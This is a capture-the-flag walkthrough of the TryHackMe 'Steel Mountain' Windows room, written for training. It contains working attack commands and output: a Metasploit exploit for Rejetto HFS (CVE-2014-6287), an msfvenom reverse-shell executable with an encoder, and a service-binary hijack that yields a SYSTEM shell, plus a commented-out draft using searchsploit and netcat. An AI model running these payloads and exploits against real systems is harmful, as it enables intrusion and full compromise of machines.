---
title: "Steel Mountain"
date: 2022-01-17 01:09:33 +0300
author: oste
image: /assets/img/Posts/SteelMountain.jpg
categories: [Tryhackme, Easy]
tags: [windows, powershell, metasploit, msfvenom, powerup]
---

| Room       | [Steel Mountain](https://tryhackme.com/room/steelmountain) |
| ---------- | ---------------------------------------------------------- |
| Author     | [tryhackme](https://tryhackme.com/p/tryhackme)             |
| Difficulty | Easy                                                       |

> In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

## Task 1 Introduction

## Who is the employee of the month?

By visiting the webpage running on port 80, we have the employees photo. Doing a reverse image lookup, you'll easily get the employees name.

![image](https://user-images.githubusercontent.com/58165365/149614893-695adbe3-2f1a-4125-b3ac-b26fbbf85b89.png)

However, with some manual enumeration, you can get the employees name by looking at the page source.

![image](https://user-images.githubusercontent.com/58165365/149614911-b32a5db9-de60-4e87-baff-203c4a196887.png)

`Bill Harper`

## Task 2 Initial Access

#### Scan the machine with nmap. What is the other port running a web server on?

We first start by running an nmap scan to determine what ports are open and what services are running.

```bash
➜  nmap -sC -sV -p- -T4 -Pn 10.10.173.129
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-15 02:59 EST
Nmap scan report for 10.10.173.129 (10.10.173.129)
Host is up (0.25s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-01-14T08:00:18
|_Not valid after:  2022-07-16T08:00:18
|_ssl-date: 2022-01-15T08:14:06+00:00; +51s from scanner time.
| rdp-ntlm-info:
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-01-15T08:13:59+00:00
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49169/tcp open  msrpc              Microsoft Windows RPC
49170/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.0.2:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:d4:d4:a9:2c:0f (unknown)
| smb2-time:
|   date: 2022-01-15T08:13:58
|_  start_date: 2022-01-15T08:00:07
|_clock-skew: mean: 50s, deviation: 0s, median: 50s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 818.77 seconds
➜
```

From the port scan , we can be able to see a webserver running on port `8080`

`8080`

#### Take a look at the other web server. What file server is running?

Visiting the webserver running on port `8080`, we can be able to quickly discover the Server information and version as indicated in the bottom left corner. From the official [documentation](https://www.rejetto.com/hfs/), we can learn that:

> You can use HFS (HTTP File Server) to send and receive files. It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.

![image](https://user-images.githubusercontent.com/58165365/149615139-04f137b9-37f3-4c53-a2de-11f00a944192.png)

`Rejetto HTTP File Server`

#### What is the CVE number to exploit this file server?

Using the information we gathered in the previous question, we can use [exploitdb](https://www.exploit-db.com/) to see if there are publicly available exploits affecting the specific version. In this case, we get afew but we are particulary interested in the second one by [Avinash Thapa](https://www.exploit-db.com/exploits/39161),which is a Remote Command Execution.

![image](https://user-images.githubusercontent.com/58165365/149627295-3580bef9-5c14-4531-98a3-df3a3340fa83.png)

`2014-6287`

#### Use Metasploit to get an initial shell. What is the user flag?

Using Metasploit, we can search the exploit using the CVE number we found as shown below.

```bash
msf6 > search 2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Once we have selected the exploit, we need to configure several options as shown below and simply exploit the server.

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.14     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.46.228
RHOSTS => 10.10.46.228
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST tun1
SRVHOST => 10.8.162.140
msf6 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 5555
SRVPORT => 5555
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.8.162.140:4444
[*] Using URL: http://10.8.162.140:5555/KFfJoV7
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /KFfJoV7
[*] Sending stage (175174 bytes) to 10.10.46.228
[*] Meterpreter session 1 opened (10.8.162.140:4444 -> 10.10.46.228:49365 ) at 2022-01-15 12:34:36 -0500
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\domDcFPAwNXVls.vbs' on the target

meterpreter >
```

We have managed to get a shell...Awesome...We can then run the shell command to get an actual shell on the system. With basic enumeration, we can see we have one user on the system called `bill`. Navigate to the users Desktop directory and you'll get the user flag.

```bash
meterpreter > shell
Process 2384 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd \
cd \

C:\>cd \users
cd \users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users

09/26/2019  10:29 PM    <DIR>          .
09/26/2019  10:29 PM    <DIR>          ..
09/26/2019  06:11 AM    <DIR>          Administrator
09/27/2019  08:09 AM    <DIR>          bill
08/22/2013  07:39 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  44,156,710,912 bytes free

C:\Users>cd bill
cd bill

C:\Users\bill>cd Desktop
cd Desktop

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  08:08 AM    <DIR>          .
09/27/2019  08:08 AM    <DIR>          ..
09/27/2019  04:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,156,710,912 bytes free

C:\Users\bill\Desktop>more user.txt
more user.txt
b0476******************************fd365

```

`b0476******************************fd365`

## Task 3 Privilege Escalation

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root! To enumerate this machine, we will use a powershell script called `PowerUp`.

> PowerUp is a PowerShell tool to assist with local privilege escalation on Windows systems. It contains several methods to identify and abuse vulnerable services, as well as DLL hijacking opportunities, vulnerable registry settings, and escalation opportunities.It is part of PowerTools and resides at [PowerShellEmpire](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) or [PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

It will check:

- if you are an admin in a medium integrity process (exploitable with bypassuac)
- for any unquoted service path issues
- for any services with misconfigured ACLs (exploitable with service\_\*)
- any improper permissions on service executables (exploitable with service*exe*\*)
- for any leftover unattend.xml files
- if the AlwaysInstallElevated registry key is set
- if any Autologon credentials are left in the registry
- for any encrypted web.config strings and application pool passwords
- for any %PATH% .DLL hijacking opportunities (exploitable with write_dllhijacker)

Download the script locally and use the upload command in Metasploit to upload the script to the target.
To execute this using Meterpreter, I will type `load powershell` into meterpreter. Then I will enter powershell by entering `powershell_shell`:

```bash
meterpreter > upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1  ./
[*] uploading  : /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 -> ./
[*] uploaded   : /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 -> ./\PowerUp.ps1
meterpreter > load powershell

Loading extension powershell...Success.
meterpreter > powershell_shell
PS > dir


    Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         1/15/2022   9:29 AM            %TEMP%
-a---         2/16/2014  12:58 PM     760320 hfs.exe
-a---         1/15/2022  10:33 AM     495329 PowerUp.ps1


PS > . .\PowerUp.ps1
PS > Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>

ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : IObitUnSvr
Path          : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'IObitUnSvr' -Path <HijackPath>

ServiceName   : LiveUpdateSvc
Path          : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'LiveUpdateSvc' -Path <HijackPath>


[*] Checking service executable and argument permissions...


ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'IObitUnSvr'



[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Windows\system32\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\system32\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\System32\WindowsPowerShell\v1.0\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\System32\WindowsPowerShell\v1.0\\wlbsctrl.dll' -Command '...'


[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


PS > ^Z
Background channel 6? [y/N]  y
```

#### Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

`AdvancedSystemCareService9`

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

We can use `msfvenom` to generate a reverse shell as an Windows executable as follows:

```bash
➜  Steel-Mountain msfvenom -p windows/shell_reverse_tcp LHOST=10.8.162.140 LPORT=1337 -e x86/shikata_ga_nai -f exe -o ASCService.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: ASCService.exe

```

We then need to set up a handler by specifying your `LHOST` & `LPORT`

```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST tun1
LHOST => 10.8.162.140
msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.162.140:1337

msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                    Payload opts
  --  ----                    -------                    ------------
  0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.8.162.140:1337

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

Upload your binary and replace the legitimate one in the correct path (`C:\Program Files (x86)\IObit\Advanced SystemCare\`). Then restart the program to get a shell as root.

```bash
meterpreter > upload /home/kali/Desktop/Steel-Mountain/ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
[*] uploading  : /home/kali/Desktop/Steel-Mountain/ASCService.exe -> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/Desktop/Steel-Mountain/ASCService.exe -> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
[*] uploaded   : /home/kali/Desktop/Steel-Mountain/ASCService.exe -> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
meterpreter > shell
Process 392 created.
Channel 15 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
[*] Command shell session 5 opened (10.8.162.140:1337 -> 10.10.46.228:49550 ) at 2022-01-15 15:28:09 -0500
id
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>^Z
Background channel 15? [y/N]  y
meterpreter >
Background session 1? [y/N]
```

As you can see above, we popped a new shell. Lets actually confirm this and use that session.

```bash
msf6 exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN                        10.8.162.140:4444 -> 10.10.46.228:49365  (10.10.46.228)
  5         shell sparc/bsd          Shell Banner: Microsoft Windows [Version 6.3.9600] -----  10.8.162.140:1337 -> 10.10.46.228:49550  (10.10.46.228)

msf6 exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...


Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----

C:\Windows\system32>whoami
whoami
nt authority\system
```

Awesome, so now we are `nt authority`, we can easily navigate to the administrators Desktop Dir and read the root flag

> NT Authority\SYSTEM a.k.a LocalSystem account is a built-in Windows Account. It is the most powerful account on a Windows local instance (More powerful than any admin account).

```
C:\Windows\system32>cd ..\..\users\administrator\Desktop
cd ..\..\users\administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  11:05 AM    <DIR>          .
10/12/2020  11:05 AM    <DIR>          ..
10/12/2020  11:05 AM             1,528 activation.ps1
09/27/2019  04:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  43,989,893,120 bytes free

C:\Users\Administrator\Desktop>more root.txt
more root.txt
9af**************************db80

C:\Users\Administrator\Desktop>[*] 10.10.46.228 - Meterpreter session 1 closed.  Reason: Died

```

#### What is the root flag?

`9af**************************db80`

<!-- ## Task 4 Access and Escalation Without Metasploit

Now let's complete the room without the use of Metasploit.

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to



To begin we shall be using the same CVE. However, this time let's use this [exploit](https://www.exploit-db.com/exploits/39161).

*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*

```bash
➜  Steel-Mountain searchsploit Rejetto HTTP File Server
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                               | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                                    | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                       | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                  | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                  | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                             | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                          | windows/webapps/49125.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
➜  Steel-Mountain searchsploit -m 39161.py

  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/kali/Desktop/Steel-Mountain/39161.py

```


To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)!

You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.

Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.

![image](https://user-images.githubusercontent.com/58165365/149614657-fb0edd59-58ba-4513-a672-4208dc3e19ae.png)

#### What powershell -c command could we run to manually find out the service name?

> *Format is "powershell -c "command here"*

Now let's escalate to Administrator with our new found knowledge.

Generate your payload using msfvenom and pull it to the system using powershell.


Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.

First we need to stop the service which we can do like so;

sc stop AdvancedSystemCareService9

Shortly followed by;

`sc start AdvancedSystemCareService9`

Once this command runs, you will see you gain a shell as Administrator on our listener! -->
